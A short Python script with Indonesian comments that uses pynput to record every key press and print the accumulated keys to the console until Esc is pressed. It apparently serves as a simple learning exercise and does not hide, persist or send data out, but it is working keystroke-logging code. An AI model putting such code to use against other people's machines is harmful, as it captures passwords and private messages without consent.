from pynput import keyboard # digunakan untuk merekam aktifitas keyboard dengan fitur listener

keys_list = []

def key_pressed(key): # gunanya untuk merekam hasil dari keyboard yg kita ketik
	try:
		keys_list.append(key)
		log_keys(keys_list)
	except:
		pass

def key_release(key): # gunanya ketika kita ketik esc maka kita akan keluar dari program
	if key == keyboard.Key.esc:
		return False

def log_keys(list_of_keys): # gunanya untuk mengantisipasi keluarnya history
	for k in list_of_keys:
		result = str(k).replace("'",'')
		print(result)

with keyboard.Listener(on_press=key_pressed, on_release=key_release) as listener:
	listener.join()